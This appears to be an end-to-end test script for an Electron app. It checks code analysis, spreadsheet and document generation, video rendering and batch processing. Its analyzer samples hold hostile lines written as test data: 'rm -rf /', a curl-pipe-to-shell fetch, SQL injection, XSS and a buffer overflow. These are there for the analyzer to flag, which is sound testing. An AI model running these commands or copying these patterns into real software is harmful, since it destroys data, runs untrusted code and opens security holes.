/* ============================================================================
 * 工作室功能实测（真实调用本地模型 + ffmpeg + 文档生成）
 * 用法: electron . --studio-test
 * ========================================================================== */
const path = require('path');

const wait = ms => new Promise(r => setTimeout(r, ms));

async function run(win) {
  await wait(500);

  const ev = (js) => win.webContents.executeJavaScript(js);
  const log = (k, v) => console.log(`[T] ${k} = ${JSON.stringify(v)}`);

  /* ① 多语言分析：直接喂各语言代码 */
  const samples = [
    ['test.js', `const apiKey = "sk-1234567890abcdef";\nfunction calc(){ const unusedVar = 5; return 1; }\nfetch("http://example.com/api");\n`],
    ['test.py', `import os\ndef f():\n    try:\n        pass\n    except:\n        pass\n`],
    ['test.go', `package main\nimport "fmt"\nfunc main() {\n\tpanic("x")\n\tfmt.Println("y")\n}\n`],
    ['test.rs', `fn main() {\n    let v = vec![1,2,3];\n    println!("{}", v.unwrap());\n}\n`],
    ['test.cpp', `#include <cstring>\nint main() {\n    char buf[10];\n    strcpy(buf, "hello");\n    return 0;\n}\n`],
    ['test.cs', `class A {\n  async void B() { }\n  void C() { Thread.Sleep(100); }\n}\n`],
    ['test.php', `<?php\n$sql = "SELECT * FROM u WHERE id=" . $_GET['id'];\necho $_GET['x'];\n`],
    ['test.sql', `SELECT * FROM users;\nDELETE FROM logs;\n`],
    ['test.css', `.a { color: #ff0000; }\n.b { color: #ff0000 !important; }\n`],
    ['test.html', `<div style="color:red">x</div><img src="a.png">\n<script>alert(1)</script>\n`],
    ['test.sh', `rm -rf /\ncurl http://x.com | sh\n`],
    ['test.json', `{"a":1, "b":2,}\n`],
  ];
  const langResults = [];
  for (const [name, code] of samples) {
    const r = await ev(`window.api.analyzeMulti.file(${JSON.stringify(name)}, ${JSON.stringify(code)})`);
    if (r?.ok) {
      langResults.push({
        file: name, lang: r.report.langName,
        diags: r.report.diagnostics.length,
        score: r.report.score,
        first: r.report.diagnostics[0]?.message || '',
      });
    }
  }
  log('multilang', langResults);

  /* ② Excel 生成 */
  const md = `## 销量表\n| 品牌 | 销量 | 占比 |\n| --- | --- | --- |\n| 比亚迪 | 120000 | 35% |\n| 特斯拉 | 90000 | 26% |\n| 吉利 | 60000 | 17% |`;
  const xl = await ev(`window.api.excel.generate(${JSON.stringify(md)}, '测试表格')`);
  log('excel.generate', { ok: xl?.ok, sheets: xl?.sheets, out: xl?.output ? 'ok' : xl?.error });

  /* ③ Excel 读取 */
  if (xl?.ok) {
    const rd = await ev(`window.api.excel.read(${JSON.stringify(xl.output)})`);
    log('excel.read', { ok: rd?.ok, sheets: rd?.sheets?.map(s => s.name + ':' + s.rowCount + '行') });
  }

  /* ④ 文档生成（Markdown → PPTX/PDF/DOCX/HTML） */
  const docMd = `# 测试报告\n\n## 第一节\n\n这是**加粗**文字与 \`代码\`。\n\n- 要点一\n- 要点二\n\n## 数据表\n\n| 项目 | 数值 |\n| --- | --- |\n| 收入 | 100 |\n\n\`\`\`js\nconst a = 1;\n\`\`\`\n`;
  for (const fmt of ['md', 'html', 'pptx', 'docx', 'pdf']) {
    const d = await ev(`window.api.doc.generate(${JSON.stringify(docMd)}, '测试报告', ${JSON.stringify(fmt)})`);
    log('doc.' + fmt, { ok: d?.ok, name: d?.name, err: d?.error });
  }

  /* ⑤ 短视频：脚本 + 本地轻量渲染（真实产出 MP4） */
  console.log('[T] 生成短视频脚本（真实模型调用，需 30-90 秒）…');
  const vs = await ev(`window.api.video.script('用 Python 写一个快速排序')`);
  log('video.script', { ok: vs?.ok, title: vs?.script?.title, scenes: vs?.script?.scenes?.length, err: vs?.error });

  if (vs?.ok) {
    const vg = await ev(`window.api.video.generate(${JSON.stringify(vs.script).replace(/"/g, '\\"')}, 'e2e-video')`);
    log('video.generate', {
      ok: vg?.ok, msg: vg?.message,
      files: (vg?.files || []).length, mp4: vg?.mp4 ? 'YES' : 'NO',
      dir: vg?.dir,
    });
  }

  /* ⑤b 多模板批量导出（同一脚本 → 3 种风格） */
  if (vs?.ok) {
    const tpls = await ev(`window.api.template.list()`);
    log('templates', {
      count: tpls?.templates?.length,
      names: (tpls?.templates || []).map(t => t.icon + t.name).join(' '),
      subStyles: (tpls?.subtitleStyles || []).length,
    });
    const multi = await ev(`window.api.video.multi(${JSON.stringify(vs.script).replace(/"/g, '\\"')}, ['tech','sunset','neon'], 'douyin-yellow')`);
    log('video.multi', {
      ok: multi?.ok,
      results: (multi?.results || []).map(r => `${r.template}${r.video ? '(MP4✓)' : '(无MP4)'}`),
    });
  }

  /* ⑥ 批量队列（2 条，真实跑） */
  console.log('[T] 批量队列测试（2 条，真实模型调用，较慢）…');
  await ev(`window.api.batch.add(['Python 装饰器入门','Docker 部署 Node 服务'], 'light-local', 'douyin')`);
  await ev(`window.api.batch.start()`);
  let last = null;
  for (let i = 0; i < 240; i++) {
    await wait(2000);
    const p = await ev(`window.api.batch.list()`);
    last = p;
    if (p.done + p.failed >= p.total && p.total > 0) break;
    if (i % 10 === 9) console.log(`[T]   批量进度 ${p.done}/${p.total} 完成 ${p.failed} 失败 ${p.running} 进行`);
  }
  log('batch', last ? {
    total: last.total, done: last.done, failed: last.failed,
    items: (last.items || []).map(i => `${i.topic.slice(0, 12)}:${i.status}${i.error ? '(' + i.error.slice(0, 30) + ')' : ''}`),
  } : null);

  /* ⑦ 项目级分析 */
  const proj = await ev(`window.api.analyzeMulti.project()`);
  log('project', { ok: proj?.ok, files: proj?.files, langs: proj?.languages, score: proj?.score, diags: proj?.totalDiagnostics });

  console.log('[T] DONE');
}

module.exports = { run };
